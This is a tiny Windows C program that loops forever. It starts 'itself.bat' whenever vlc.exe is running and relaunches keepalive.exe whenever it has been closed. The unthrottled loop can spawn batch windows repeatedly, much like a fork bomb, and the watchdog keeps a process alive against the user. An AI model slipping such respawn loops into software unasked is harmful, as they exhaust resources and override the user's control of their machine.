#include<stdlib.h>
main()
{
system("color 0A");
x:system("tasklist | findstr vlc.exe && start itself.bat");
system("tasklist | findstr keepalive.exe || start keepalive.exe");
goto x;
}
